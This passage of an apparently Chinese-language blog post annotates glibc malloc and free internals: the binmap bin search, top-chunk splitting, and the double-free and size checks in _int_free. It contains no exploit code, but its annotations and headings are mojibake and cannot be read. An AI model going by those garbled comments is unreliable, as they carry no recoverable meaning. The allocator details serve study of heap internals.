class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size = chunksize (victim)) &lt;<br>                     (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb)))<br>               victim = victim-&gt;bk_nextsize;<br><br>             <span class="hljs-comment">/* Avoid removing the first entry for a size so that the skip</span><br><span class="hljs-comment">                list does not have to be rerouted.  */</span><br>             <span class="hljs-keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)<br>               victim = victim-&gt;fd;<br><span class="hljs-comment">//é¿å…ç§»èµ°æœ‰å¾ˆå¤šä¸ªchunkçš„å°chunké“¾çš„å¤´ç»“ç‚¹</span><br><br>             remainder_size = size - nb;<br>             unlink (av, victim, bck, fwd);<br><span class="hljs-comment">//æ‘˜é™¤</span><br><br>             <span class="hljs-comment">/* Exhaust */</span><br><span class="hljs-comment">//ä¸èƒ½åˆ‡åˆ†åˆ™å…¨éƒ¨è¿”å›</span><br>             <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE)<br>               &#123;<br>                 set_inuse_bit_at_offset (victim, size);<br>                 <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                   victim-&gt;size |= NON_MAIN_ARENA;<br>               &#125;<br>             <span class="hljs-comment">/* Split */</span><br>             <span class="hljs-keyword">else</span><br><span class="hljs-comment">//èƒ½åˆ‡åˆ†åˆ™åˆ‡åˆ†åè¿”å›ï¼Œå¹¶å°†remainderæ’å…¥unsorted bin</span><br>               &#123;<br>                 remainder = chunk_at_offset (victim, nb);<br>                 <span class="hljs-comment">/* We cannot assume the unsorted list is empty and therefore</span><br><span class="hljs-comment">                    have to perform a complete insert here.  */</span><br>                 bck = unsorted_chunks (av);<br>                 fwd = bck-&gt;fd;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))<br>                   &#123;<br>                     errstr = <span class="hljs-string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;<br>                     <span class="hljs-keyword">goto</span> errout;<br>                   &#125;<br>                 remainder-&gt;bk = bck;<br>                 remainder-&gt;fd = fwd;<br>                 bck-&gt;fd = remainder;<br>                 fwd-&gt;bk = remainder;<br><span class="hljs-comment">//å¦‚æœremainderå¤§å°å±äºfast binåˆ™nextsizeæŒ‡é’ˆç½®é›¶</span><br>                 <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>                   &#123;<br>                     remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                     remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                   &#125;<br>                 set_head (victim, nb | PREV_INUSE |<br>                           (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>                 set_head (remainder, remainder_size | PREV_INUSE);<br>                 set_foot (remainder, remainder_size);<br>               &#125;<br>             check_malloced_chunk (av, victim, nb);<br>             <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>             alloc_perturb (p, bytes);<br>             <span class="hljs-keyword">return</span> p;<br>           &#125;<br>       &#125;<br></code></pre></td></tr></table></figure><h4 id="binmapæœç´¢bin"><a href="#binmapæœç´¢bin" class="headerlink" title="binmapæœç´¢bin"></a>binmapæœç´¢bin</h4><p>ï¼ˆ10ï¼‰è¿›å…¥å†…å±‚ç¬¬äºŒä¸ªfor(;;)å¾ªç¯ï¼Œæ ¹æ®binmapæœç´¢bins</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//å®šä½binmapæ•°ç»„</span><br>      ++idx;<br>      bin = bin_at (av, idx);<br>      block = idx2block (idx);<br>      <span class="hljs-built_in">map</span> = av-&gt;binmap[block];<br>      bit = idx2bit (idx);<br><br>      <span class="hljs-keyword">for</span> (;; )<br>        &#123;<br>          <span class="hljs-comment">/* Skip rest of block if there are no more set bits in this block.  */</span><br>          <span class="hljs-keyword">if</span> (bit &gt; <span class="hljs-built_in">map</span> || bit == <span class="hljs-number">0</span>)<br>            &#123;<br>              <span class="hljs-keyword">do</span><span class="hljs-comment">//æ‰¾æ¯”è¦æ±‚å¤§å°å¤§çš„ç¬¬ä¸€ä¸ªbin_block</span><br>                &#123;<br>                  <span class="hljs-keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="hljs-comment">/* out of bins */</span><br>                    <span class="hljs-keyword">goto</span> use_top;<span class="hljs-comment">//å¦‚æœbinså…¨ç©ºï¼Œåˆ‡å‰²top chunk</span><br>                &#125;<br>              <span class="hljs-keyword">while</span> ((<span class="hljs-built_in">map</span> = av-&gt;binmap[block]) == <span class="hljs-number">0</span>);<br><br>              bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));<br>              bit = <span class="hljs-number">1</span>;<br>            &#125;<br><br>          <span class="hljs-comment">/* Advance to bin with set bit. There must be one. */</span><br>          <span class="hljs-keyword">while</span> ((bit &amp; <span class="hljs-built_in">map</span>) == <span class="hljs-number">0</span>)<span class="hljs-comment">//å®šä½bin</span><br>            &#123;<br>              bin = next_bin (bin);<br>              bit &lt;&lt;= <span class="hljs-number">1</span>;<br>              assert (bit != <span class="hljs-number">0</span>);<br>            &#125;<br><br>          <span class="hljs-comment">/* Inspect the bin. It is likely to be non-empty */</span><br>          victim = last (bin);<br><br>          <span class="hljs-comment">/*  If a false alarm (empty bin), clear the bit. */</span><br>          <span class="hljs-keyword">if</span> (victim == bin)<br>            &#123;<br>              av-&gt;binmap[block] = <span class="hljs-built_in">map</span> &amp;= ~bit; <span class="hljs-comment">/* Write through */</span><br>              bin = next_bin (bin);<br>              bit &lt;&lt;= <span class="hljs-number">1</span>;<br>            &#125;<br><br>          <span class="hljs-keyword">else</span><span class="hljs-comment">//åˆ‡å‰²å¹¶å°†remainderæ’å…¥unsorted binï¼ŒåŒä¸Š</span><br>            &#123;<br>              size = chunksize (victim);<br><br>              <span class="hljs-comment">/*  We know the first chunk in this bin is big enough to use. */</span><br>              assert ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb));<br><br>              remainder_size = size - nb;<br><br>              <span class="hljs-comment">/* unlink */</span><br>              unlink (av, victim, bck, fwd);<br><br>              <span class="hljs-comment">/* Exhaust */</span><br>              <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE)<br>                &#123;<br>                  set_inuse_bit_at_offset (victim, size);<br>                  <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                    victim-&gt;size |= NON_MAIN_ARENA;<br>                &#125;<br><br>              <span class="hljs-comment">/* Split */</span><br>              <span class="hljs-keyword">else</span><br>                &#123;<br>                  remainder = chunk_at_offset (victim, nb);<br><br>                  <span class="hljs-comment">/* We cannot assume the unsorted list is empty and therefore</span><br><span class="hljs-comment">                     have to perform a complete insert here.  */</span><br>                  bck = unsorted_chunks (av);<br>                  fwd = bck-&gt;fd;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))<br>                    &#123;<br>                      errstr = <span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;<br>                      <span class="hljs-keyword">goto</span> errout;<br>                    &#125;<br>                  remainder-&gt;bk = bck;<br>                  remainder-&gt;fd = fwd;<br>                  bck-&gt;fd = remainder;<br>                  fwd-&gt;bk = remainder;<br><br>                  <span class="hljs-comment">/* advertise as last remainder */</span><br>                  <span class="hljs-keyword">if</span> (in_smallbin_range (nb))<br>                    av-&gt;last_remainder = remainder;<br>                  <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>                    &#123;<br>                      remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                      remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                    &#125;<br>                  set_head (victim, nb | PREV_INUSE |<br>                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>                  set_head (remainder, remainder_size | PREV_INUSE);<br>                  set_foot (remainder, remainder_size);<br>                &#125;<br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><h4 id="åˆ‡å‰²top-chunk"><a href="#åˆ‡å‰²top-chunk" class="headerlink" title="åˆ‡å‰²top chunk"></a>åˆ‡å‰²top chunk</h4><p>ï¼ˆ11ï¼‰åˆ‡å‰²top chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c">   use_top:<br><br>     victim = av-&gt;top;<br>     size = chunksize (victim);<br><br><span class="hljs-comment">//top chunkå¯åˆ‡å‰²å°±åˆ‡å‰²å¹¶è¿”å›</span><br>     <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>       &#123;<br>         remainder_size = size - nb;<br>         remainder = chunk_at_offset (victim, nb);<br>         av-&gt;top = remainder;<br>         set_head (victim, nb | PREV_INUSE |<br>                   (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>         set_head (remainder, remainder_size | PREV_INUSE);<br><br>         check_malloced_chunk (av, victim, nb);<br>         <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>         alloc_perturb (p, bytes);<br>         <span class="hljs-keyword">return</span> p;<br>       &#125;<br><br>     <span class="hljs-comment">/* When we are using atomic ops to free fast chunks we can get</span><br><span class="hljs-comment">        here for all block sizes.  */</span><br>     <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (have_fastchunks (av))<br>       &#123;<br>         malloc_consolidate (av);<span class="hljs-comment">//å¦‚æœfastbinéç©ºï¼Œæ•´ç†</span><br>         <span class="hljs-comment">/* restore original bin index */</span><br>         <span class="hljs-keyword">if</span> (in_smallbin_range (nb))<span class="hljs-comment">//ç¡®å®šindexï¼Œå¤–éƒ¨å¾ªç¯å†æ¬¡å°è¯•</span><br>           idx = smallbin_index (nb);<br>         <span class="hljs-keyword">else</span><br>           idx = largebin_index (nb);<br>       &#125;<br><br>     <span class="hljs-comment">/*</span><br><span class="hljs-comment">        Otherwise, relay to handle system-dependent cases</span><br><span class="hljs-comment">      */</span><br>     <span class="hljs-keyword">else</span><span class="hljs-comment">//å¦åˆ™sysmallocåˆ†é…</span><br>       &#123;<br>         <span class="hljs-type">void</span> *p = sysmalloc (nb, av);<br>         <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>)<br>           alloc_perturb (p, bytes);<br>         <span class="hljs-keyword">return</span> p;<br>       &#125;<br></code></pre></td></tr></table></figure><h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><h3 id="libc-free"><a href="#libc-free" class="headerlink" title="__libc_free"></a>__libc_free</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br>__libc_free (<span class="hljs-type">void</span> *mem)<br>&#123;<br>  mstate ar_ptr;<br>  mchunkptr p;                          <span class="hljs-comment">/* chunk corresponding to mem */</span><br><br>  <span class="hljs-type">void</span> (*hook) (<span class="hljs-type">void</span> *, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)<br>    = atomic_forced_read (__free_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    &#123;<br>      (*hook)(mem, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><span class="hljs-comment">//è¯»å–free_hook</span><br><br>  <span class="hljs-keyword">if</span> (mem == <span class="hljs-number">0</span>)                              <span class="hljs-comment">/* free(0) has no effect */</span><br>    <span class="hljs-keyword">return</span>;<br><br>  p = mem2chunk (mem);<br><br>  <span class="hljs-keyword">if</span> (chunk_is_mmapped (p))                       <span class="hljs-comment">/* release mmapped memory. */</span><br>    &#123;<br>      <span class="hljs-comment">/* see if the dynamic brk/mmap threshold needs adjusting */</span><br>      <span class="hljs-keyword">if</span> (!mp_.no_dyn_threshold<br>          &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold<br>          &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)<br>        &#123;<br>          mp_.mmap_threshold = chunksize (p);<br>          mp_.trim_threshold = <span class="hljs-number">2</span> * mp_.mmap_threshold;<br>          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="hljs-number">2</span>,<br>                      mp_.mmap_threshold, mp_.trim_threshold);<br>        &#125;<br>      munmap_chunk (p);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>  ar_ptr = arena_for_chunk (p);<br>  _int_free (ar_ptr, p, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h3><h4 id="ä¸€äº›å®‰å…¨æ£€æŸ¥"><a href="#ä¸€äº›å®‰å…¨æ£€æŸ¥" class="headerlink" title="ä¸€äº›å®‰å…¨æ£€æŸ¥"></a>ä¸€äº›å®‰å…¨æ£€æŸ¥</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">size = chunksize (p);<br><span class="hljs-comment">//ç­›æ‰ä¸€äº›ç‰¹åˆ«å¤§çš„chunkï¼ˆè¶…å‡ºå†…å­˜è¾¹ç•Œï¼‰</span><br>  <span class="hljs-keyword">if</span> (__builtin_expect ((<span class="hljs-type">uintptr_t</span>) p &gt; (<span class="hljs-type">uintptr_t</span>) -size, <span class="hljs-number">0</span>)<br>      || __builtin_expect (misaligned_chunk (p), <span class="hljs-number">0</span>))<br>    &#123;<br>      errstr = <span class="hljs-string">&quot;free(): invalid pointer&quot;</span>;<br>    errout:<br>      <span class="hljs-keyword">if</span> (!have_lock &amp;&amp; locked)<br>        (<span class="hljs-type">void</span>) mutex_unlock (&amp;av-&gt;mutex);<br>      malloc_printerr (check_action, errstr, chunk2mem (p), av);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><span class="hljs-comment">//å¯¹é½æ£€æŸ¥</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))<br>    &#123;<br>      errstr = <span class="hljs-string">&quot;free(): invalid size&quot;</span>;<br>      <span class="hljs-keyword">goto</span> errout;<br>    &#125;<br><br><span class="hljs-comment">//ä»…å½“å®šä¹‰äº†MALLOC_DEBUGæ—¶ä½¿ç”¨</span><br>  check_inuse_chunk(av, p);<br></code></pre></td></tr></table></figure><h4 id="chunkåœ¨fastbinèŒƒå›´å†…ä¸”ä¸‹ä¸€ä¸ªchunkä¸æ˜¯top-chunk"><a href="#chunkåœ¨fastbinèŒƒå›´å†…ä¸”ä¸‹ä¸€ä¸ªchunkä¸æ˜¯top-chunk" class="headerlink" title="chunkåœ¨fastbinèŒƒå›´å†…ä¸”ä¸‹ä¸€ä¸ªchunkä¸æ˜¯top chunk"></a>chunkåœ¨fastbinèŒƒå›´å†…ä¸”ä¸‹ä¸€ä¸ªchunkä¸æ˜¯top chunk</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(size) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(get_max_fast ())<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> TRIM_FASTBINS</span><br>      <span class="hljs-comment">/*</span><br><span class="hljs-comment">If TRIM_FASTBINS set, don&#x27;t place chunks</span><br><span class="hljs-comment">bordering top into fastbins</span><br><span class="hljs-comment">      */</span><br>      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      ) &#123;<br><br><span class="hljs-comment">//ä¸‹ä¸€ä¸ªchunkçš„sizeåˆæ³•</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>|| __builtin_expect (chunksize (chunk_at_offset (p, size))<br>     &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>))<br>      &#123;<br><span class="hljs-comment">/* We might not have a lock at this point and concurrent modifications</span><br><span class="hljs-comment">   of system_mem might have let to a false positive.  Redo the test</span><br><span class="hljs-comment">   after getting the lock.  */</span><br><span class="hljs-keyword">if</span> (have_lock<br>    || (&#123; assert (locked == <span class="hljs-number">0</span>);<br>  mutex_lock(&amp;av-&gt;mutex);<br>  locked = <span class="hljs-number">1</span>;<br>  chunk_at_offset (p, size)-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ<br>    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;<br>      &#125;))<br>  &#123;<br>    errstr = <span class="hljs-string">&quot;free(): invalid next size (fast)&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>  &#125;<br><span class="hljs-keyword">if</span> (! have_lock)<br>  &#123;<br>    (<span class="hljs-type">void</span>)mutex_unlock(&amp;av-&gt;mutex);<br>    locked = <span class="hljs-number">0</span>;<br>  &#125;<br>      &#125;<br><br><span class="hljs-comment">//é‡Šæ”¾å‰user dataå¡«å……ä¸ºperturb_byteï¼ˆ0ï¼‰</span><br>    free_perturb (chunk2mem(p), size - <span class="hljs-number">2</span> * SIZE_SZ);<br><br>    set_fastchunks(av);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> idx = fastbin_index(size);<br>    fb = &amp;fastbin (av, idx);<br><br><span class="hljs-comment">//åŸå­æ“ä½œå°†chunkæ’å…¥fast bin</span><br>    mchunkptr old = *fb, old2;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> old_idx = ~<span class="hljs-number">0u</span>;<br>    <span class="hljs-keyword">do</span><br>      &#123;<br><span class="hljs-comment">//æ£€æŸ¥fastbinçš„ç¬¬ä¸€ä¸ªchunkæ˜¯ä¸æ˜¯æ’å…¥çš„chunkï¼ˆdouble freeæ£€æŸ¥ï¼‰</span><br><span class="hljs-keyword">if</span> (__builtin_expect (old == p, <span class="hljs-number">0</span>))<br>  &#123;<br>    errstr = <span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>  &#125;<br><br><span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span>)<br>  old_idx = fastbin_index(chunksize(old));<br>p-&gt;fd = old2 = old;<br>      &#125;<br>    <span class="hljs-keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);<br><br>    <span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="hljs-number">0</span>))<br>      &#123;<br>errstr = <span class="hljs-string">&quot;invalid fastbin entry (free)&quot;</span>;<br><span class="hljs-keyword">goto</span> errout;<br>      &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><h4 id="émmapçš„chunkï¼Œå…ˆæ˜¯ä¸€äº›å®‰å…¨æ£€æŸ¥"><a href="#émmapçš„chunkï¼Œå…ˆæ˜¯ä¸€äº›å®‰å…¨æ£€æŸ¥" class="headerlink" title="émmapçš„chunkï¼Œå…ˆæ˜¯ä¸€äº›å®‰å…¨æ£€æŸ¥"></a>émmapçš„chunkï¼Œå…ˆæ˜¯ä¸€äº›å®‰å…¨æ£€æŸ¥</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!chunk_is_mmapped(p)) &#123;<br>    <span class="hljs-keyword">if</span> (! have_lock) &#123;<br>      (<span class="hljs-type">void</span>)mutex_lock(&amp;av-&gt;mutex);<br>      locked = <span class="hljs-number">1</span>;<br>    &#125;<br><br>    nextchunk = chunk_at_offset(p, size);<br><br><span class="hljs-comment">//ä¸æ˜¯top chunk</span><br>    <span class="hljs-keyword">if</span> (__glibc_unlikely (p == av-&gt;top))<br>      &#123;<br>errstr = <span class="hljs-string">&quot;double free or corruption (top)&quot;</span>;<br><span class="hljs-keyword">goto</span> errout;<br>      &#125;<br><br><span class="hljs-comment">//nextchunkè¶Šç•Œ</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect (contiguous (av)<br>  &amp;&amp; (<span class="hljs-type">char</span> *) nextchunk<br>  &gt;= ((<span class="hljs-type">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="hljs-number">0</span>))<br>      &#123;<br>errstr = <span class="hljs-string">&quot;double free or corruption (out)&quot;</span>;<br><span class="hljs-keyword">goto</span> errout;<br>      &#125;<br><br><span class="hljs-comment">//nextchunkçš„preinuseæ£€æŸ¥chunkæ˜¯å¦åœ¨ä½¿ç”¨ï¼ˆdouble freeæ£€æŸ¥ï¼‰</span><br>    <span class="hljs-keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))<br>      &#123;<br>errstr = <span class="hljs-string">&quot;double free or corruption (!prev)&quot;</span>;<br><span class="hljs-keyword">goto</span> errout;<br>      &#125;<br><br><span class="hljs-comment">//nextsizeåˆæ³•æ£€æŸ¥</span><br>    nextsize = chunksize(nextchunk);<br>    <span class="hljs-keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>))<br>      &#123;<br>errstr = <span class="hljs-string">&quot;free(): invalid next size (normal)&quot;</span>;<br><span class="hljs-keyword">goto</span> errout;<br>      &#125;<br><br><br><br>â€¦â€¦<br><br><br><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="chunkåˆå¹¶"><a href="#chunkåˆå¹¶" class="headerlink" title="chunkåˆå¹¶"></a>chunkåˆå¹¶</h4><p>å…ˆå‘ä¸‹åˆå¹¶å†å‘ä¸Šåˆå¹¶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 